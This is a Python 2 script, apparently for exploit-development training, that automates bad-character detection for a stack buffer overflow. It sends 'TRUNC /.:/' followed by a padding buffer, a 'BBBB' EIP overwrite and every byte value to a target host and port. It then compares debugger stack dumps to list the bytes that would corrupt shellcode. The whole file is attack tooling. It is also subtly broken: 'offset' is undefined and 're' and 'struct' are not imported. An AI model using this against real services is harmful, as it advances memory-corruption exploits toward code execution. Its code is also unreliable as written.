#!/usr/bin/python
import socket, sys, os

host = str(raw_input("Host: "))
port = int(raw_input("Port: "))

prefix = 'TRUNC /.:/'						#Change This
suffix = ''  								#Change This
print "\n[+]Prefix:" + prefix
print "\n[+]Suffix:" + suffix

debug = True
 
if debug:
	badCharList = []
	print "(-) Beginning bad character detection."
	print "\nPlease restart the vulnerable service and your debugger. Press enter to continue"
	for i in range(256):
		badCharList.append(bytes(chr(i)))	#Add every character to our list to test
	raw_input()
	if debug:				#TO DO: Remove this line and fix indentation
		foundChars = []			#List of characters that are bad
		print "(-) Assuming \\x00, \\x0a, and \\x0d are bad characters"
		badCharList.remove("\x00")
		#badCharList.remove("\x0a")
		#badCharList.remove("\x0d")
		foundChars.append("\x00")
		#foundChars.append("\x0a")
		#foundChars.append("\x0d")
		while True:			#Loop until we find all bad chars
			try:
				print('Sending Character list')
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.settimeout(15)
				s.connect((host, port))
				s.send(str(prefix) + str("A"*offset + "BBBB") + "".join(badCharList) + str(suffix))
				s.recv(1024)
				s.close()
				print('Sent! EIP Overwritten with BBBB')
				print('Check the stack dump for bad chars')
			except:
				print('Failed to connect, try again')
				break
			print "\nPlease open your debugger and copy/paste the dump output from the beginning of the stack to least 256 bytes. Enter 2 newlines to stop or 'q' to terminate bad character detection."
			debugOutput = ""
			while True:
				response = raw_input()
				if response == "" or response == "q":
					break
				debugOutput += response + "\n"
			if debugOutput == "":		#If they quit
				break
			print "(-) Detecting bad characters"
			outputList = debugOutput.split("\n")	#Break up output into lines
			charList = []
			for line in outputList:
				if len(line.split(" ")) < 2:	#If we have a malformed line
					continue
				byteString = re.split(r'\s\s+',line)[1]	#Break up line into three sections and grab bytes
				charList.extend(byteString.split())
			if len(charList) < len(badCharList):
				print "\n(!) Dump not large enough! Please restart the application and try again! Press enter to continue\n\n"
				raw_input()
				continue
			foundCharsIteration = []
			finalFoundChar = None			#If one character corrupts all further characters, we can only assume the first is bad
			finalCharBuffer = None
			for i in range(len(badCharList)):		#If the characters don't match, it's bad.
				if badCharList[i] != bytes(chr(int(charList[i], 16))):
					foundCharsIteration.append(badCharList[i])
					finalCharBuffer = badCharList[i]
				else:
					finalFoundChar = finalCharBuffer
			for character in foundCharsIteration:	#Add every character we know is bad to the list of bad characters
				foundChars.append(character)
				print "(*) Found bad character: " + bytes(character)
				badCharList.remove(character)	#Don't use it when we run the test again
				if character == finalFoundChar or (not finalFoundChar and finalFoundChar != ""):
					break	#If we never found a single match, our first character is bad

			if badCharList[len(badCharList) - 2] == bytes(chr(int(charList[len(badCharList) - 2],16))) and badCharList[len(badCharList) - 1] != bytes(chr(int(charList[len(badCharList) - 1], 16))):
				foundChars.append(badCharList[len(badCharList) - 1])
				foundChars.append(badCharList[len(badCharList) - 1])
				#This is an edge case. If the final character is wrong but the one before it was correct, it's probably bad


			if len(foundCharsIteration) == 0:	#If all characters are good
				output = ""
				for character in foundChars:
					 output += hex(struct.unpack( ">I", "\x00\x00\x00" + character)[0])
				print "(*) All bad characters found: " + output.replace("0x", "\\x")
				break
